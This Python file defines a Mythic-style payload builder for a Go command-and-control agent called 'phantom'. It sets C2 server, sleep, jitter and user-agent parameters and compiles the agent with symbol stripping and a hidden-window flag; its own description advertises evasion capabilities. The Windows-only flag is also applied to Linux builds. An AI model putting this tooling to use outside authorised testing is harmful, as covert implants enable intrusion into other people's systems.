#!/usr/bin/env python3
import pathlib
import asyncio
from mythic_container import MythicGoRPC
from mythic_container.PayloadBuilder import *
from mythic_container.PayloadTypeBuilder import *

# Define the Phantom payload type
class Phantom(PayloadType):
    name = "phantom"
    file_extension = "exe"
    author = "@phantom"
    supported_os = [
        SupportedOS.Windows,
        SupportedOS.Linux,
    ]
    wrapper = False
    wrapped_payloads = []
    note = "Phantom is an advanced C2 agent written in Go with extensive evasion capabilities"
    supports_dynamic_loading = True
    mythic_encrypts = False
    translation_container = None
    agent_type = "agent"
    agent_icon_path = pathlib.Path(".") / "phantom" / "agent_functions" / "mythic_agent_icon.svg"
    build_parameters = [
        BuildParameter(
            name="server_url",
            parameter_type=BuildParameterType.String,
            description="HTTP C2 server URL",
            default_value="https://domain.com",
        ),
        BuildParameter(
            name="sleep",
            parameter_type=BuildParameterType.Number,
            description="Sleep interval in seconds",
            default_value="5",
        ),
        BuildParameter(
            name="jitter",
            parameter_type=BuildParameterType.Number,
            description="Jitter percentage (0-100)",
            default_value="10",
        ),
        BuildParameter(
            name="user_agent",
            parameter_type=BuildParameterType.String,
            description="User agent string for HTTP requests",
            default_value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        ),
        BuildParameter(
            name="aes_key",
            parameter_type=BuildParameterType.String,
            description="AES encryption key (32 bytes hex)",
            default_value="",
        ),
        BuildParameter(
            name="debug",
            parameter_type=BuildParameterType.Boolean,
            description="Enable debug mode",
            default_value=False,
        ),
    ]
    c2_profiles = ["HTTP"]
    
    async def build(self) -> BuildResponse:
        # Build the Go payload
        resp = BuildResponse(status=BuildStatus.Success)
        
        # Create the build command
        build_cmd = "cd agent && GOOS={} GOARCH={} go build -ldflags=\"-s -w -H windowsgui\" -trimpath -o ../{}".format(
            "windows" if self.selected_os == SupportedOS.Windows else "linux",
            "amd64",
            "phantom.exe" if self.selected_os == SupportedOS.Windows else "phantom"
        )
        
        # Execute build
        proc = await asyncio.create_subprocess_shell(
            build_cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=self.agent_code_path
        )
        
        stdout, stderr = await proc.communicate()
        
        if proc.returncode != 0:
            resp.status = BuildStatus.Error
            resp.build_stderr = stderr.decode()
            return resp
        
        # Read the built binary
        binary_path = self.agent_code_path / ("phantom.exe" if self.selected_os == SupportedOS.Windows else "phantom")
        
        try:
            with open(binary_path, "rb") as f:
                resp.payload = f.read()
        except Exception as e:
            resp.status = BuildStatus.Error
            resp.build_stderr = str(e)
            return resp
        
        resp.build_stdout = stdout.decode()
        return resp